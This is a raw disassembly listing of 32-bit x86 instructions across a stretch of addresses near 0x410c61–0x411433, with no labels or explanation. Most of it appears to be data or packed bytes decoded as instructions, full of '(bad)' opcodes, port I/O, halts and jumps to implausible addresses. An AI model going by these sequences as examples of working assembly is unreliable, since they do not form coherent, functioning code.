  410c61:	pop    ebp
  410c62:	push   ebp
  410c63:	inc    ebx
  410c64:	in     al,dx
  410c65:	pop    ebp
  410c66:	in     al,dx
  410c67:	cmp    edx,DWORD PTR [edi-0x8]
  410c6a:	xor    eax,0x895b9c94
  410c6f:	leave  
  410c70:	call   0x89965379
  410c75:	in     al,dx
  410c76:	in     al,0x45
  410c78:	dec    ebp
  410c79:	push   esi
  410c7a:	test   DWORD PTR [eax+0xfb010f],esi
  410c80:	add    BYTE PTR [eax+0xc018b],dh
  410c86:	leave  
  410c87:	inc    ebp
  410c88:	test   al,ch
  410c8a:	add    dh,bh
  410c8c:	add    bh,bh
  410c8e:	dec    ebp
  410c8f:	push   cs
  410c90:	mov    DWORD PTR [ecx],eax
  410c92:	hlt    
  410c93:	push   es
  410c94:	dec    ebp
  410c95:	leave  
  410c96:	mov    DWORD PTR [eax],ecx
  410c98:	clc    
  410c99:	cmovge eax,ecx
  410c9c:	mov    ecx,0x85c2f0
  410ca2:	clc    
  410ca3:	pop    DWORD PTR [ebp+0x1]
  410ca6:	push   ebx
  410ca7:	add    BYTE PTR [ebp-0x15],bh
  410caa:	push   esi
  410cab:	xor    eax,0x898a45
  410cb0:	cld    
  410cb1:	push   es
  410cb2:	inc    ebp
  410cb3:	add    BYTE PTR [ebx],dh
  410cb5:	pushfw 
  410cb7:	add    DWORD PTR [esi+0x78308c1],edi
  410cbd:	add    ah,BYTE PTR [ebx-0x49]
  410cc0:	int    0xbb
  410cc2:	mov    ecx,DWORD PTR [esi+0xc]
  410cc5:	add    dh,al
  410cc7:	cmp    ecx,ebx
  410cc9:	jne    0x410c93
  410ccb:	xor    ecx,DWORD PTR [ebp+0x66]
  410cce:	jmp    0xc80cd4
  410cd3:	add    DWORD PTR [ebp+0x0],eax
  410cd6:	mov    eax,ebx
  410cd8:	or     al,0x8b
  410cda:	(bad)  
  410cdb:	mov    ecx,esi
  410cdd:	mov    BYTE PTR [eax+eax*1+0x664c13a],cl
  410ce4:	mov    eax,edi
  410ce6:	or     BYTE PTR [edx],cl
  410ce8:	shl    cl,cl
  410cea:	icebp  
  410ceb:	add    BYTE PTR [ebp+0x36],0x8b
  410cef:	or     BYTE PTR [edx+eax*2],cl
  410cf2:	(bad)  
  410cf3:	or     cl,dh
  410cf5:	stc    
  410cf6:	shl    DWORD PTR [ebp-0x30],0xc6
  410cfa:	xor    al,0x0
  410cfc:	inc    ebp
  410cfd:	xchg   BYTE PTR [ebx],al
  410cff:	add    esp,edi
  410d01:	add    BYTE PTR [ebp-0x39],cl
  410d04:	mov    al,bl
  410d06:	test   DWORD PTR [ebx+0x1c348375],ecx
  410d0c:	sub    al,0xbf
  410d0e:	jmp    0x410c95
  410d10:	mov    edi,eax
  410d12:	lock jge 0x410d06
  410d15:	lea    esi,[edx-0x74bad503]
  410d1b:	mov    ebp,esp
  410d1d:	or     cl,dh
  410d1f:	leave  
  410d20:	add    al,BYTE PTR [eax+eax*4-0x37ff9d00]
  410d27:	dec    ebp
  410d28:	dec    ebp
  410d29:	test   DWORD PTR [ebx],eax
  410d2b:	paddb  mm6,mm0
  410d2e:	add    DWORD PTR [eax],eax
  410d30:	dec    ebp
  410d31:	mov    ecx,DWORD PTR [ebx-0x62b217f0]
  410d37:	mov    esi,DWORD PTR [edx]
  410d39:	or     al,0x2b
  410d3b:	dec    ebp
  410d3c:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  410d42:	mov    esp,ebp
  410d44:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  410d4b:	mov    DWORD PTR [ebx],ebp
  410d4d:	call   0xc74967d
  410d52:	mov    DWORD PTR [ebp+0x10],ecx
  410d55:	(bad)  
  410d56:	push   0x8b85ff10
  410d5b:	clc    
  410d5c:	or     al,0x56
  410d5e:	(bad)  
  410d5f:	push   ecx
  410d60:	retf   
  410d61:	mov    ebx,0xff4d8dc8
  410d66:	mov    DWORD PTR [ebp+0x8],eax
  410d69:	xor    eax,DWORD PTR [ebp-0x75]
  410d6c:	cmp    ebp,DWORD PTR [ebx]
  410d6e:	lsl    ebx,WORD PTR [edi-0x8]
  410d72:	call   DWORD PTR [ebx-0x741bff75]
  410d78:	(bad)  
  410d79:	or     al,0x5b
  410d7b:	dec    ebp
  410d7c:	or     BYTE PTR [ebx],dh
  410d7e:	inc    ebp
  410d7f:	xor    esi,DWORD PTR ds:0x708088d
  410d85:	in     eax,0x9d
  410d87:	add    BYTE PTR [edx],dh
  410d89:	inc    ebp
  410d8a:	pop    edi
  410d8b:	xor    eax,edx
  410d8d:	test   DWORD PTR [eax],0x83108b8b
  410d93:	dec    ebp
  410d94:	adc    al,0x33
  410d96:	inc    ebp
  410d97:	xor    esi,DWORD PTR ds:0xc73b9c2b
  410d9d:	jne    0x410d9b
  410d9f:	mov    eax,DWORD PTR [ebp+0x345f808]
  410da5:	mov    eax,DWORD PTR [ebp-0xc]
  410da8:	mov    DWORD PTR [eax],0x685c9f4
  410dae:	clc    
  410daf:	dec    eax
  410db0:	push   edi
  410db1:	ss inc ebp
  410db3:	pop    ss
  410db4:	aad    0x4d
  410db6:	xlat   BYTE PTR ds:[ebx]
  410db7:	or     BYTE PTR [ebx+0x4d63fc56],0xd1
  410dbe:	mov    eax,0x780084d
  410dc3:	push   esi
  410dc4:	clc    
  410dc5:	ret    0xe99d
  410dc8:	xor    dl,dl
  410dca:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  410dd0:	js     0x88799cf
  410dd6:	dec    ebp
  410dd7:	push   ebp
  410dd8:	mov    edi,DWORD PTR [eax+0xc872fc]
  410dde:	lock enter 0xceca,0xf2
  410de3:	retf   0x18ce
  410de6:	jne    0x410e35
  410de8:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  410dee:	enter  0xf0d6,0xca
  410df2:	retf   0xf2c8
  410df5:	into   
  410df6:	out    dx,al
  410df7:	dec    ebp
  410df8:	dec    ebp
  410df9:	jmp    0xff450d31
  410dfe:	xor    eax,DWORD PTR [ebp-0x15]
  410e01:	xor    esi,DWORD PTR [ebx]
  410e03:	mov    esi,DWORD PTR [ebx]
  410e05:	sub    eax,DWORD PTR [ebx]
  410e07:	add    eax,DWORD PTR [ebx]
  410e09:	or     bl,dl
  410e0b:	dec    ebp
  410e0c:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  410e12:	xor    eax,DWORD PTR [ebp-0xf00073]
  410e18:	jb     0x410e5f
  410e1a:	add    BYTE PTR [ebx],dh
  410e1c:	dec    ebp
  410e1d:	pop    esi
  410e1e:	mov    ebp,ebx
  410e20:	cld    
  410e21:	mov    esi,eax
  410e23:	call   0x520f64f0
  410e28:	stc    
  410e29:	add    eax,0x4572aa
  410e2e:	pop    edi
  410e2f:	leave  
  410e30:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  410e37:	in     al,dx
  410e38:	mov    eax,edi
  410e3a:	xor    eax,0xf8008520
  410e40:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  410e47:	mov    eax,DWORD PTR [ebp-0x77]
  410e4a:	xor    bh,al
  410e4c:	pushf  
  410e4d:	inc    ebp
  410e4e:	(bad)  
  410e4f:	cmp    eax,0x56869ce8
  410e54:	clc    
  410e55:	mov    edi,0x8518e4ec
  410e5b:	jmp    0xf056:0x8b457df8
  410e62:	push   esi
  410e63:	push   esi
  410e64:	push   ecx
  410e65:	push   ecx
  410e66:	push   edi
  410e67:	xor    eax,esi
  410e69:	mov    edx,0x32729d
  410e6e:	add    ecx,eax
  410e70:	mov    edx,edi
  410e72:	clc    
  410e73:	retf   0xaf45
  410e76:	cmp    eax,0xc78b9ceb
  410e7b:	clc    
  410e7c:	cld    
  410e7d:	jne    0x410e97
  410e7f:	xor    ebp,edx
  410e81:	xor    eax,DWORD PTR [ebp+0x3]
  410e84:	or     BYTE PTR [ebx],al
  410e86:	add    BYTE PTR [ebp-0x7747475],al
  410e8c:	hlt    
  410e8d:	dec    ebp
  410e8e:	dec    ebp
  410e8f:	je     0x410ec4
  410e91:	xor    esi,DWORD PTR [ebx]
  410e93:	xor    eax,DWORD PTR [ebx]
  410e95:	add    eax,DWORD PTR [ebx]
  410e97:	add    ecx,DWORD PTR [edi]
  410e99:	rol    ecx,cl
  410e9b:	mov    esi,DWORD PTR [ecx]
  410e9d:	in     al,dx
  410e9e:	inc    ebp
  410e9f:	enter  0xca2b,0x33
  410ea3:	icebp  
  410ea4:	mov    DWORD PTR [edx],ecx
  410ea6:	clc    
  410ea7:	lock pop ebp
  410ea9:	enter  0xf2e8,0xfe
  410ead:	retf   0xeeff
  410eb0:	inc    ebp
  410eb1:	jne    0x410e3e
  410eb3:	mov    edi,eax
  410eb5:	cld    
  410eb6:	dec    ebp
  410eb7:	enter  0xbc89,0x8d
  410ebb:	popf   
  410ebc:	sti    
  410ebd:	xor    bh,bh
  410ebf:	mov    eax,DWORD PTR [ebp-0xc]
  410ec2:	mov    esi,DWORD PTR [ebp-0x4]
  410ec5:	xor    eax,esi
  410ec7:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9d]
  410ece:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  410ed4:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  410eda:	(bad)  
  410edb:	push   ebp
  410edc:	shr    esp,0x4d
  410edf:	in     al,dx
  410ee0:	cmp    eax,DWORD PTR [esi+esi*2]
  410ee3:	add    BYTE PTR [ebx-0x39ca1bbb],cl
  410ee9:	pushf  
  410eea:	mov    edi,0x85c7f445
  410ef0:	call   0xf88695ed
  410ef5:	xor    eax,0x53619cdb
  410efa:	dec    ebp
  410efb:	inc    ebp
  410efc:	mov    esi,DWORD PTR [eax+edi*8]
  410eff:	pushf  
  410f00:	into   
  410f01:	mov    ecx,edi
  410f03:	in     al,dx
  410f04:	call   0x8b4954c7
  410f09:	pop    es
  410f0a:	or     BYTE PTR [ebx],dh
  410f0c:	or     BYTE PTR [edi+0x8a724d],bh
  410f12:	or     eax,edi
  410f14:	push   ebp
  410f15:	inc    ebp
  410f16:	cmpxchg8b (bad)
  410f17:	(bad)  
  410f18:	leave  
  410f19:	loopne 0x410ee5
  410f1b:	test   DWORD PTR [ebp-0x8],ecx
  410f1e:	mov    eax,DWORD PTR [ebp-0x18]
  410f21:	aad    0x55
  410f23:	xlat   BYTE PTR ds:[ebx]
  410f24:	xor    eax,edi
  410f26:	add    esi,eax
  410f28:	and    eax,DWORD PTR [eax]
  410f2a:	mov    eax,DWORD PTR [eax]
  410f2c:	(bad)  
  410f2d:	leave  
  410f2e:	sti    
  410f2f:	inc    ebp
  410f30:	dec    DWORD PTR [ebx-0x39cc13ab]
  410f36:	mov    esi,ecx
  410f38:	clc    
  410f39:	(bad)  
  410f3a:	dec    ebp
  410f3b:	iret   
  410f3c:	xor    ebp,DWORD PTR [edi-0x74f71473]
  410f42:	jb     0x410f40
  410f44:	add    bh,al
  410f46:	inc    ebp
  410f47:	(bad)  
  410f48:	mov    eax,DWORD PTR [ebp-0xc]
  410f4b:	(bad)  
  410f4c:	xabort 0x63
  410f4f:	loopne 0x410f1e
  410f51:	jmp    FWORD PTR [ebx]
  410f53:	mov    DWORD PTR [ebx],eax
  410f55:	clc    
  410f56:	lock inc ebp
  410f58:	dec    ebp
  410f59:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  410f5f:	loopne 0x410f94
  410f61:	inc    DWORD PTR [ebx]
  410f63:	mov    edi,DWORD PTR [ebx]
  410f65:	hlt    
  410f66:	jne    0x410fb5
  410f68:	mov    esi,DWORD PTR [ebx]
  410f6a:	in     al,0x8d
  410f6c:	dec    ebp
  410f6d:	or     BYTE PTR [ebx],dh
  410f6f:	jb     0x410f74
  410f71:	add    BYTE PTR [edi+0x45],bl
  410f74:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  410f7a:	add    BYTE PTR [ebx],dh
  410f7c:	mov    esi,DWORD PTR [ebx]
  410f7e:	mov    ebp,DWORD PTR [ebx]
  410f80:	sbb    BYTE PTR [ebx-0x377403b3],cl
  410f86:	nop
  410f87:	mov    ecx,0x338b4500
  410f8c:	add    DWORD PTR [ebx],0x70
  410f8f:	mov    DWORD PTR [esi-0x8],edx
  410f92:	jne    0x410fd9
  410f94:	mov    esi,DWORD PTR [edi+edx*2]
  410f97:	pushf  
  410f98:	push   esi
  410f99:	mov    edx,DWORD PTR [ecx-0x15]
  410f9c:	xor    ecx,DWORD PTR [ebx+0x4572e0bb]
  410fa2:	add    BYTE PTR [ebx],dh
  410fa4:	retf   
  410fa5:	add    edx,ecx
  410fa7:	ror    DWORD PTR [edi],cl
  410fa9:	mov    DWORD PTR ds:0x7f452dfc,ebp
  410faf:	mov    ch,dl
  410fb1:	mov    BYTE PTR [eax+0xb],dh
  410fb4:	fimul  WORD PTR [ebp+0x0]
  410fb7:	mov    ecx,DWORD PTR [ebx+0x55b608f8]
  410fbd:	xor    esi,DWORD PTR [ebx]
  410fbf:	mov    DWORD PTR [ebx],esi
  410fc1:	or     BYTE PTR [ebx],al
  410fc3:	dec    ebp
  410fc4:	add    ecx,DWORD PTR [ebx-0x318af7c5]
  410fca:	or     edi,0x8c64ca9c
  410fd0:	out    dx,eax
  410fd1:	loopne 0x410fe8
  410fd3:	(bad)  
  410fd4:	jmp    0x13d1464
  410fd9:	retf   0x4d4d
  410fdc:	xor    ecx,DWORD PTR [ebx-0x31c40bfd]
  410fe2:	je     0x3241ad8c
  410fe8:	mov    ecx,DWORD PTR [ecx+0x45450818]
  410fee:	mov    DWORD PTR [ebx],esi
  410ff0:	sbb    BYTE PTR [ecx-0x7472b3],bh
  410ff6:	mov    eax,ecx
  410ff8:	fmul   DWORD PTR [ebp+0x45]
  410ffb:	mov    DWORD PTR ds:0xba459cf0,esi
  411001:	mov    eax,DWORD PTR [ebp+0x55c6f8f0]
  411007:	(bad)  
  411008:	mov    ecx,eax
  41100a:	sbb    BYTE PTR [ecx-0x7474babb],dl
  411010:	sbb    al,bh
  411012:	add    dh,0x1
  411015:	mov    DWORD PTR [eax],0x4dc1005e
  41101b:	leave  
  41101c:	mov    eax,DWORD PTR [eax+ebx*1]
  41101f:	push   ebp
  411020:	mov    esp,ebp
  411022:	add    DWORD PTR [ebp+0x0],eax
  411025:	mov    ecx,DWORD PTR [ecx]
  411027:	or     BYTE PTR [eax-0x80],cl
  41102a:	mov    DWORD PTR [ecx],eax
  41102c:	or     al,0x0
  41102e:	inc    ebp
  41102f:	add    BYTE PTR [ebx],dh
  411031:	in     al,dx
  411032:	add    edx,DWORD PTR [ebx-0x77]
  411035:	mov    esi,esp
  411037:	adc    BYTE PTR [ebp+0x16],al
  41103a:	xor    edi,DWORD PTR [edi+0x7890803]
  411040:	adc    al,0xcf
  411042:	inc    ebp
  411043:	popf   
  411044:	mov    esi,DWORD PTR [edx]
  411046:	push   eax
  411047:	add    ebp,eax
  411049:	cmp    ecx,DWORD PTR [ecx+0x4581d075]
  41104f:	pushf  
  411050:	mov    esp,DWORD PTR [eax+edi*1+0x44]
  411054:	dec    ebp
  411055:	fwait
  411056:	dec    eax
  411057:	jmp    0xcc149d
  41105c:	or     al,0x4d
  41105e:	sbb    BYTE PTR [ebx-0x3074f3c0],cl
  411064:	or     al,0xd7
  411066:	dec    ecx
  411067:	retf   
  411068:	dec    eax
  411069:	rcl    eax,cl
  41106b:	retf   0xfc8
  41106e:	inc    ebp
  41106f:	or     eax,0x7f382d8b
  411074:	sar    esp,0x3
  411077:	lahf   
  411078:	inc    eax
  411079:	mov    ebp,0x8b180089
  41107e:	inc    ebp
  41107f:	or     BYTE PTR [ebx],dh
  411081:	iret   
  411082:	add    ecx,ebx
  411084:	mov    ecx,eax
  411086:	adc    al,0x84
  411088:	inc    ebp
  411089:	add    al,0x33
  41108b:	add    BYTE PTR [ebx],al
  41108d:	dec    ebp
  41108e:	mov    DWORD PTR [ecx+0x4d45dc14],ecx
  411094:	mov    ecx,DWORD PTR [ebx+0x6c714d4]
  41109a:	ret    
  41109b:	inc    ebp
  41109c:	add    edi,eax
  41109e:	push   ebp
  41109f:	or     bh,al
  4110a1:	test   DWORD PTR [eax+edi*8],edx
  4110a4:	test   DWORD PTR [edx],esi
  4110a6:	clc    
  4110a7:	pushf  
  4110a8:	inc    ebp
  4110a9:	mov    DWORD PTR [eax],esi
  4110ab:	lock pushf 
  4110ad:	inc    ebp
  4110ae:	(bad)  
  4110af:	mov    DWORD PTR [eax+ebx*1],edx
  4110b2:	test   DWORD PTR [ebp-0x8],eax
  4110b5:	mov    eax,DWORD PTR [ebp-0x70]
  4110b8:	mov    eax,DWORD PTR [eax]
  4110ba:	sbb    BYTE PTR [ebx-0x2b3c7639],cl
  4110c0:	scas   eax,DWORD PTR es:[edi]
  4110c1:	dec    ebp
  4110c2:	mov    ecx,DWORD PTR [ebx+0x559008]
  4110c8:	xor    ecx,DWORD PTR [ebx+0x3c11038d]
  4110ce:	jb     0x41111d
  4110d0:	add    BYTE PTR [ebx-0x387cf73f],cl
  4110d6:	add    eax,ebx
  4110d8:	add    BYTE PTR [ebp+0x45],al
  4110db:	mov    esi,DWORD PTR [ebx]
  4110dd:	or     BYTE PTR [ebx],al
  4110df:	(bad)  
  4110e0:	mov    ebx,eax
  4110e2:	adc    al,0x45
  4110e4:	inc    ebp
  4110e5:	mov    eax,DWORD PTR [ebx]
  4110e7:	or     al,0xdc
  4110e9:	inc    eax
  4110ea:	inc    ebp
  4110eb:	cmp    edi,0xc
  4110ee:	hlt    
  4110ef:	inc    ebp
  4110f0:	jne    0x41107d
  4110f2:	mov    ecx,DWORD PTR [esp+ecx*1]
  4110f5:	inc    eax
  4110f6:	bound  ecx,QWORD PTR [ebx-0x7a76f301]
  4110fc:	clc    
  4110fd:	push   esp
  4110fe:	inc    ebp
  4110ff:	inc    ebp
  411100:	cmp    eax,0x8b8b9c74
  411105:	cmp    al,ah
  411107:	dec    ebp
  411108:	(bad)  
  411109:	mov    eax,ebx
  41110b:	push   esp
  41110c:	(bad)  
  41110d:	idiv   DWORD PTR [eax-0x87417dd]
  411113:	or     al,0xff
  411115:	inc    eax
  411116:	inc    ebp
  411117:	add    eax,DWORD PTR [ebp-0x74748b15]
  41111d:	push   esp
  41111e:	loopne 0x411165
  411120:	(bad)  
  411121:	mov    eax,ebx
  411123:	or     bh,bh
  411125:	xbegin 0x508656ee
  41112b:	mov    ebx,esp
  41112d:	or     bh,bh
  41112f:	(bad)  
  411130:	mov    eax,ebx
  411132:	hlt    
  411133:	inc    ebp
  411134:	inc    ebp
  411135:	mov    ecx,DWORD PTR [ebx+0x4d4de008]
  41113b:	xor    ebp,DWORD PTR [ebx]
  41113d:	add    ecx,DWORD PTR [ecx+0x4589e089]
  411143:	adc    al,0x8b
  411145:	inc    ebp
  411146:	clc    
  411147:	xor    eax,DWORD PTR [eax-0x64]
  41114a:	add    eax,edi
  41114c:	or     al,0x14
  41114e:	dec    ebp
  41114f:	test   DWORD PTR [ebx],edi
  411151:	clc    
  411152:	jb     0x411199
  411154:	mov    esi,DWORD PTR [ecx]
  411156:	clc    
  411157:	pushf  
  411158:	inc    eax
  411159:	mov    ecx,DWORD PTR [ebx+0x414df8f0]
  41115f:	xor    ecx,DWORD PTR [ebx-0x3ef01ffd]
  411165:	shr    esi,0x4d
  411168:	add    BYTE PTR [ebx-0x30002f96],cl
  41116e:	hlt    
  41116f:	mov    WORD PTR [ebp-0x63],es
  411172:	push   eax
  411173:	xor    dl,BYTE PTR [ebx+edi*1-0x5347f001]
  41117a:	test   DWORD PTR [eax],eax
  41117c:	clc    
  41117d:	mov    eax,DWORD PTR [ebp+0x8]
  411180:	mov    edi,0x4585c3c8
  411186:	clc    
  411187:	mov    eax,DWORD PTR [ebp+0x18]
  41118a:	xor    eax,DWORD PTR [ebp-0x64]
  41118d:	mov    edi,eax
  41118f:	hlt    
  411190:	shl    BYTE PTR [ebp-0x7b],0x8b
  411194:	clc    
  411195:	fmul   QWORD PTR [ebp+0x4d]
  411198:	mov    eax,ebp
  41119a:	in     al,dx
  41119b:	icebp  
  41119c:	dec    ebp
  41119d:	dec    DWORD PTR [ecx+0x4dc7e845]
  4111a3:	loopne 0x41112e
  4111a5:	test   eax,edi
  4111a7:	clc    
  4111a8:	dec    ebp
  4111a9:	inc    ebp
  4111aa:	mov    DWORD PTR [ebx],esi
  4111ac:	in     al,0x3
  4111ae:	dec    ebp
  4111af:	push   eax
  4111b0:	xor    eax,DWORD PTR [ebp+0x3]
  4111b3:	push   eax
  4111b4:	mov    DWORD PTR [eax-0x20],edx
  4111b7:	push   edi
  4111b9:	mov    eax,DWORD PTR [eax]
  4111bb:	clc    
  4111bc:	cmp    eax,0xf84e85c0
  4111c1:	inc    ebp
  4111c2:	test   BYTE PTR [ebx],dh
  4111c4:	add    DWORD PTR [ebx],eax
  4111c6:	add    BYTE PTR [eax+0x4d],dl
  4111c9:	jne    0x4111fe
  4111cb:	lea    ecx,[ebx-0x7617fc48]
  4111d1:	cmc    
  4111d2:	adc    al,0xff
  4111d4:	inc    ebp
  4111d5:	inc    ebp
  4111d6:	xor    ecx,DWORD PTR [ecx+0x4530e08d]
  4111dc:	jb     0x411169
  4111de:	add    ah,bl
  4111e0:	inc    ebp
  4111e1:	ror    DWORD PTR [ebx+0x4d8bf045],0xf8
  4111e8:	xor    ecx,DWORD PTR [ebp+0x3]
  4111eb:	mov    edi,DWORD PTR [ebx]
  4111ed:	adc    BYTE PTR [ebp+0x41],dh
  4111f0:	mov    ecx,DWORD PTR [ebx-0x37381ff8]
  4111f6:	ret    
  4111f7:	push   ss
  4111f8:	push   0x45
  4111fa:	lea    ecx,[ebx+0x4de80cac]
  411200:	cli    
  411201:	add    edi,edi
  411203:	or     BYTE PTR [ebp+0x4d],al
  411206:	mov    ebp,DWORD PTR [ebx]
  411208:	xor    ebp,ecx
  41120a:	mov    al,BYTE PTR [edx]
  41120c:	add    eax,0xc7200
  411211:	jne    0x411260
  411213:	lea    esi,[ebx]
  411215:	lods   al,BYTE PTR ds:[esi]
  411216:	psubsb mm0,mm0
  411219:	cmc    
  41121a:	retf   
  41121b:	inc    ecx
  41121d:	xor    eax,0x89019c84
  411222:	add    ah,cl
  411224:	inc    ebp
  411225:	inc    ebp
  411226:	mov    esi,DWORD PTR [edx]
  411228:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c405c7]
  41122f:	test   DWORD PTR [eax],eax
  411231:	clc    
  411232:	dec    ebp
  411233:	inc    ebp
  411234:	xor    esi,DWORD PTR [eax]
  411236:	setl   al
  411239:	(bad)  
  41123a:	retf   
  41123b:	int3   
  41123c:	ror    DWORD PTR [ebp-0x7c],0x8d
  411240:	add    eax,ecx
  411242:	add    BYTE PTR [ebp+0x45],cl
  411245:	lea    ecx,[ebx-0x75b2cc3c]
  41124b:	lea    eax,ds:0x4d72c0
  411251:	mov    ecx,DWORD PTR [ebp+0x8]
  411254:	xor    ecx,edi
  411256:	bswap  ebx
  411258:	ror    BYTE PTR [ebp-0x35],0xe9
  41125c:	rol    DWORD PTR [ecx],0x84
  41125f:	add    BYTE PTR [ecx],al
  411261:	xor    eax,DWORD PTR [eax]
  411263:	pushf  
  411264:	inc    ebp
  411265:	jnp    0x8a414669
  41126b:	mov    eax,DWORD PTR ds:0xcf72f0
  411271:	lock dec ebp
  411273:	retf   
  411274:	xor    ecx,DWORD PTR [ebp+0xf]
  411277:	mov    eax,eax
  411279:	loopne 0x411246
  41127b:	test   ecx,0x19d8484
  411281:	xor    al,BYTE PTR [eax]
  411283:	mov    DWORD PTR [ebp-0x20],eax
  411286:	mov    eax,DWORD PTR [ebp+0x33]
  411289:	mov    ecx,DWORD PTR [edx+0x72c705e0]
  41128f:	ret    
  411290:	add    al,cl
  411292:	dec    ebp
  411293:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  411299:	add    ecx,DWORD PTR ds:0xc7250
  41129f:	inc    ebp
  4112a0:	rcl    DWORD PTR [eax+0x4d],0x5f
  4112a4:	mov    edi,edi
  4112a6:	xor    ecx,DWORD PTR [ebx+0xdec8a]
  4112ac:	jb     0x411275
  4112ae:	add    BYTE PTR [ecx+eax*8-0x74cdb2b7],al
  4112b5:	mov    esi,DWORD PTR [ebx]
  4112b7:	or     BYTE PTR [edx+0x72b60dcf],cl
  4112bd:	add    eax,DWORD PTR [eax]
  4112bf:	cmp    ecx,eax
  4112c1:	jne    0x41133f
  4112c7:	mov    eax,DWORD PTR [ebp-0x18]
  4112ca:	mov    eax,DWORD PTR [eax]
  4112cc:	xor    eax,edi
  4112ce:	mov    al,BYTE PTR [ebp+eax*1+0x327249]
  4112d5:	mov    ecx,DWORD PTR [ebp+0x8]
  4112d8:	mov    ecx,edi
  4112da:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4112e0:	jb     0x4112f1
  4112e2:	add    BYTE PTR [eax-0x3f],bl
  4112e5:	add    BYTE PTR [ebp-0x75],cl
  4112e8:	mov    edi,eax
  4112ea:	xor    eax,DWORD PTR [eax]
  4112ec:	mov    al,bh
  4112ee:	or     eax,0x497284
  4112f3:	xor    al,cl
  4112f5:	mov    ecx,DWORD PTR [ebp+0x8]
  4112f8:	mov    ecx,edi
  4112fa:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  411300:	jb     0x411311
  411302:	add    BYTE PTR [eax],bh
  411304:	enter  0x8500,0x8b
  411308:	add    ah,ah
  41130a:	add    BYTE PTR [eax],al
  41130c:	inc    ebp
  41130d:	(bad)  
  41130e:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a49]
  411315:	mov    esi,DWORD PTR [edx+0x8]
  411318:	add    bh,cl
  41131a:	dec    ebp
  41131b:	mov    dh,0x8b
  41131d:	add    esi,DWORD PTR [ebx]
  41131f:	cmp    ecx,DWORD PTR [edx+0x72180d0f]
  411325:	add    BYTE PTR [eax],al
  411327:	mov    eax,ecx
  411329:	call   0xc7cc137b
  41132e:	xor    eax,DWORD PTR [edx+ecx*4+0x72320d49]
  411335:	mov    eax,DWORD PTR [eax]
  411337:	in     al,dx
  411338:	ror    DWORD PTR [ecx],0x4d
  41133b:	iret   
  41133c:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a49]
  411343:	xor    dh,BYTE PTR [edx-0x75]
  411346:	add    al,bh
  411348:	enter  0x5009,0xcf
  41134c:	inc    ebp
  41134d:	mov    WORD PTR [ebx-0x75cdccb7],cs
  411353:	or     al,BYTE PTR ds:0xec728b
  411359:	or     DWORD PTR [ebp-0x31],ecx
  41135c:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4d]
  411363:	cmp    dh,BYTE PTR [edx+0xf]
  411366:	add    ah,dl
  411368:	rol    DWORD PTR [eax],0x4d
  41136b:	mov    ecx,DWORD PTR [ebx-0x75ffcc08]
  411371:	(bad)  
  411372:	or     eax,0x497284
  411377:	xor    al,cl
  411379:	mov    ecx,DWORD PTR [ebp-0x18]
  41137c:	mov    ecx,DWORD PTR [ecx]
  41137e:	xor    ecx,edi
  411380:	mov    cl,BYTE PTR [ebp+ecx*1+0x327249]
  411387:	xor    cl,al
  411389:	mov    edx,DWORD PTR [eax]
  41138b:	in     al,0x45
  41138d:	or     DWORD PTR [eax-0x31],edx
  411390:	mov    ds:0x8b49ff8c,eax
  411395:	xor    dh,BYTE PTR [edx+ecx*1-0x17f5743f]
  41139c:	inc    ebp
  41139d:	or     DWORD PTR [ebx],esi
  41139f:	iret   
  4113a0:	add    ecx,DWORD PTR [ecx+ecx*4+0x4532144d]
  4113a7:	cmp    dh,BYTE PTR [ebx]
  4113a9:	jge    0x7241443f
  4113af:	mov    eax,DWORD PTR [eax]
  4113b1:	in     al,0xc7
  4113b3:	add    BYTE PTR [ebp-0x39],cl
  4113b6:	mov    eax,DWORD PTR [esp+edx*1-0x34cd30b7]
  4113bd:	mov    edx,ecx
  4113bf:	clc    
  4113c0:	test   BYTE PTR [ecx],cl
  4113c2:	std    
  4113c3:	iret   
  4113c4:	dec    DWORD PTR [ebp+eax*2+0x14328b49]
  4113cb:	xor    al,bh
  4113cd:	mov    eax,ebx
  4113cf:	in     al,dx
  4113d0:	enter  0x1109,0xcf
  4113d4:	inc    ebp
  4113d5:	mov    WORD PTR [ebx-0x38cde7b7],cs
  4113db:	or     al,BYTE PTR [ebx+ecx*4+0x932f89d]
  4113e2:	jmp    0x4113b3
  4113e4:	push   0xffffff8c
  4113e6:	dec    DWORD PTR [ebp-0xc]
  4113e9:	xor    al,BYTE PTR [ebp+0x3a]
  4113ec:	push   eax
  4113ed:	jne    0x411409
  4113ef:	mov    edi,edi
  4113f1:	in     al,0x8b
  4113f3:	add    BYTE PTR [eax],cl
  4113f5:	(bad)  
  4113f6:	dec    ebp
  4113f7:	test   BYTE PTR [ebx],dh
  4113f9:	dec    ecx
  4113fa:	add    esi,DWORD PTR [edx]
  4113fc:	cmp    ecx,DWORD PTR [ebx+0x98bec74]
  411402:	or     bh,cl
  411404:	(bad)  
  411405:	mov    ebx,es
  411407:	dec    ecx
  411408:	push   0x32
  41140a:	lea    esi,[edx]
  41140c:	xchg   esp,eax
  41140d:	mov    ebp,eax
  41140f:	call   0xd0401e0c
  411414:	inc    ebp
  411415:	mov    WORD PTR [ebx+0x45321849],es
  41141b:	or     bh,bh
  41141d:	mov    ebp,DWORD PTR [eax-0x74f68a1c]
  411423:	iret   
  411424:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411425:	mov    WORD PTR [ebp+0x4d],es
  411428:	push   eax
  411429:	xor    bl,dh
  41142b:	cmp    bh,bh
  41142d:	jne    0x4113ba
  41142f:	lea    ecx,[eax]
  411431:	lods   al,BYTE PTR ds:[esi]
  411432:	dec    ebp
  411433:	call   0xff450e6b
